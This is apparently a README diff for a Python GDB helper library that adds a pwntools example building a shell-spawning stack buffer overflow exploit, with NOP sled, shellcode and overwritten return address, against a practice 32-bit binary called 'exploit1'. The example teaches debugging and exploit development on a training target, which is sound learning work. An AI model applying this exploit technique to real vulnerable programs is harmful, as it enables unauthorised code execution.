@@ -89,5 +89,39 @@ crackme by simple stepping and setting `RAX` to `0` to bypass the comparison
 9. We now wait for a new string, `"Flag is: "`, to return instead of the usual `"plz! \n"`
 10. We print the flag (I don't think that's the good one though)
 
+Let's try to exploit a program now with "exploit1" (32b). No explanation on how to exploit a basic BoF, just how to do
+it with gdbhelper almost automatically.
+```python
+# coding=utf-8
+
+
+from pwn import *
+from gdbhelper import Peda
+
+
+debug = Peda("./exploit1")
+pattern = debug.pattern_create(268)  # (1)
+debug.bp("*0x8048488")
+debug.r(pattern, prompt=True)
+buff = p32(int(debug.reg("esp")[1], 16))
+debug.dis(1)  # (2)
+debug.c(prompt=True)
+offset = debug.pattern_offset(debug.reg("eip")[0][1:].decode("hex")[::-1])  # (3)
+bug = "A" * offset + "B"*4 + "C"*(268 - offset - 4)
+shellcode = asm(shellcraft.sh())
+nop = asm(shellcraft.i386.nop())*(offset - len(shellcode))
+bug = shellcode + nop + buff + "C"*(268 - offset - 4)
+debug.hb("*%s" % hex(u32(buff)))  # (4)
+debug.r("'%s'" % bug, prompt=True)  # (5)
+debug.i()  # (6)
+
+```
+1. We create a pattern using Peda's `pattern_create` command then we launch the program, get our buffer's address
+2. We disable the breakpoint, it won't be needed anymore and continue the execution until a segmentation fault occurs
+3. We check the offset of `EIP` using Peda's `pattern_offset` command and then construct our exploit string using Pwntools
+4. We set a hardware BP on the address of our buffer to break on our shellcode
+5. We relaunch the program with our shellcode and wait for the HB to trigger
+6. We use the interactive console to step into the shellcode and watch everything's going well!
+
 You can obviously use all `gdbhelper.Gdb` methods from `gdbhelper.Peda` or `gdbhelper.Pwndbg`. I invite you to discover
 all available methods of those three classes with their arguments by yourself.
